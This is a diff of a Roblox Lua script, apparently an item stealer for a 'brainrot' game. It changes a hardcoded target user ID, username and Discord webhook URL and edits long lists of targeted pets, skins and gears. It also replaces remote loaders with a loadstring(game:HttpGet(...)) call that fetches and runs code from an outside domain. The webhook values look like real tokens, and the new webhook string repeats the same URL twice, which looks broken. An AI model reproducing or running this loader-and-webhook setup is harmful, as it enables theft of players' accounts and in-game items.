@@ -1,11 +1,13 @@
-local TARGET_ID = 5648211987
-local TARGET_USER = "Sp2s112"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1569483633146732704/R7P6XdITanoHFRhXNSU1zxHi1QHwcDLqPv-iQV19F9ERX0Cx2ys6e-P9i8drCna6XxUy"
+local TARGET_ID = 3919275912
+local TARGET_USER = "harodoh99"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1564685873029718076/7bZcwst-Xo-B3BjYfouhRrAt4tVaavbVty2-CnAPsX3NzmnXF6ScZH2pSQ86R6VB-z4o https://discord.com/api/webhooks/1564685873029718076/7bZcwst-Xo-B3BjYfouhRrAt4tVaavbVty2-CnAPsX3NzmnXF6ScZH2pSQ86R6VB-z4o"
 
 local TargetBrainrots = {
-    ["Burguro and Fryuro"] = true,
-    ["Garama and Madundung"] = true,
-    ["Lavadorito Spinito"] = true,
+    ["Dragon Skeletonini"] = true,
+    ["Phoenix"] = true,
+    ["Plant Bros"] = true,
+    ["Hydra Serpent"] = true,
+    ["Orchidox"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -78,6 +80,7 @@ local TargetBrainrots = {
     ["Bunny and Eggy"] = true,
     ["Bunny Bunny Bunny Sahur"] = true,
     ["Buntteo"] = true,
+    ["Burguro and Fryuro"] = true,
     ["Burrito Bandito"] = true,
     ["Capitano Moby"] = true,
     ["Cash or Card"] = true,
@@ -115,6 +118,7 @@ local TargetBrainrots = {
     ["Fragrama and Chocrama"] = true,
     ["Frankentteo"] = true,
     ["GOAT"] = true,
+    ["Garama and Madundung"] = true,
     ["Giftini Spyderini"] = true,
     ["Ginger Gerat"] = true,
     ["Gobblino Uniciclino"] = true,
@@ -155,6 +159,7 @@ local TargetBrainrots = {
     ["Las Sis"] = true,
     ["Las Tralaleritas"] = true,
     ["Las Vaquitas Saturnitas"] = true,
+    ["Lavadorito Spinito"] = true,
     ["Coco and Mango"] = true,
     ["Los Secret Combinasionas"] = true,
     ["Examen Bros"] = true,
@@ -282,12 +287,7 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true,
-    ["Dragon Skeletonini"] = true,
-    ["Phoenix"] = true,
-    ["Plant Bros"] = true,
-    ["Hydra Serpent"] = true,
-    ["Orchidox"] = true
+    ["Deputy Leopard"] = true
 }
 
 local TargetBaseSkins = {
@@ -321,9 +321,9 @@ local TargetBaseSkins = {
 local TargetGears = {
     ["Alien Slap"] = true,
     ["Blackhole Bomb"] = true,
+    ["Bloodmoon Hammer"] = true,
     ["Bloodmoon Slap"] = true,
     ["Candy Sentry"] = true,
-    ["Candy Slap"] = true,
     ["Cupid's Wings"] = true,
     ["Cursed Slap"] = true,
     ["Cyber Slap"] = true,
@@ -341,16 +341,11 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true,
-    ["Bloodmoon Hammer"] = true
+    ["Crystal Slap"] = true
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()
+    loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=cfdbbs0z"))()
 
     task.wait(1)
 
